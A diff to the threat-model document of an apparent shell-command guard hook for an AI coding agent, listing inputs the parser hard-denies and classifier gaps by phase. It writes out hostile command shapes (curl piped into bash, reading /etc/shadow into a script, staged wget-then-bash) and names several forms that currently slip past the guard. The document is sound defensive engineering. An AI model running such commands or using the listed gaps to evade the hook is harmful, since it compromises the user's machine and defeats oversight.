@@ -36,9 +36,28 @@ Barbican does not defend against these classes; the user's operating environment
 
 ## Known parser limits
 
-Enumerate each case where `tree-sitter-bash` or our wrapper can't classify an expression with confidence, and the Barbican response. Deny-by-default applies to all of these unless the user sets `BARBICAN_ALLOW_UNPARSEABLE=1` (explicit opt-out that surfaces the input in the audit log).
+Cases where `tree-sitter-bash` or our wrapper can't classify an expression with confidence, and the Barbican response. Deny-by-default applies to all of these unless explicitly noted; per-phase tests pin the current behavior so later work can't regress it.
 
-- _(Placeholder)_ Populated as `feat/pre-bash-*` branches land.
+### Parser-level (hard-deny)
+
+Every input the parser rejects collapses to `ParseError::Malformed` and the hook exits with the Claude Code block code. The walker rejects:
+
+- **Unclean tree-sitter parse** — unterminated quotes, unmatched parens, truncated heredocs. `tree.root_node().has_error()` is the signal.
+- **Unrepresentable pipeline stages** — any stage that isn't a bare `command` or `redirected_statement{command}`. In particular `curl … | (bash)`, `curl … | { bash; }`, `curl … | if true; then bash; fi` are all rejected, because the wrapping construct hides the inner sink from classifiers.
+- **Compound/subshell/control-flow body carrying a trailing redirect** — `{ cat /etc/shadow; } > /tmp/x.sh`, `( cmd ) > /tmp/x`. The redirect cannot be safely attributed to any one inner command, and the shape is the H2 attack surface.
+- **Invalid UTF-8 byte boundaries inside a node range** — defensive; `&str` input guarantees UTF-8 at the buffer level but a grammar bug producing a non-boundary range would otherwise silently drop bytes.
+- **Recursion deeper than `MAX_DEPTH = 100`** — defense-in-depth against stack-overflow DoS from nested `$(…)`.
+
+### Classifier-level (documented limits by phase)
+
+These inputs parse cleanly but are outside the scope of the phase that shipped the current classifier. Later phases close them; tests pin the current behavior.
+
+- **Variable indirection on `argv[0]`** — e.g. `CURL=/usr/bin/curl; $CURL https://x | bash`. The parser surfaces `$CURL` as the basename, not `curl`, so the H1 classifier doesn't match. Requires variable tracking which Phase 2 does not ship. Pinned by `variable_indirection_allows_phase2_does_not_resolve_vars`.
+- **Case-sensitive shell names** — `BASH` ≠ `bash` on Unix. Pinned by `uppercase_shell_name_allows_bash_is_case_sensitive`.
+- **Staged writes without a pipeline** — `wget -O /tmp/s.sh; bash /tmp/s.sh`. Phase 2 H1 only classifies within-pipeline shapes; the cross-command staging pattern is Phase 3 H2. Pinned by `two_pipelines_curl_then_bash_allows_h1_is_per_pipeline`.
+- **`bash -c "$(curl …)"`** — the substitution contains a bare `curl` with no `|bash` inside, so H1's within-pipeline rule doesn't fire. The re-entry wrapper classifier in Phase 4 M1 will catch this by gating `bash -c <sub>` on the sub's contents. Pinned by `bash_dash_c_curl_substitution_allows_for_now_phase4_m1`.
+- **Cyrillic confusables in PostToolUse scan** — NFKC normalization is applied, but NFKC does not map Cyrillic `і` (U+0456) to Latin `i`. A dedicated confusables pass would catch this class; not yet shipped. Pinned by `nfkc_does_not_map_cyrillic_i`.
+- **Heredoc body capture** — the IR captures the heredoc delimiter (with surrounding quoting) so classifiers can distinguish quoted from unquoted forms. The body itself is not yet surfaced to classifiers; a later phase will if H2/M1 need it.
 
 ## Configuration
 
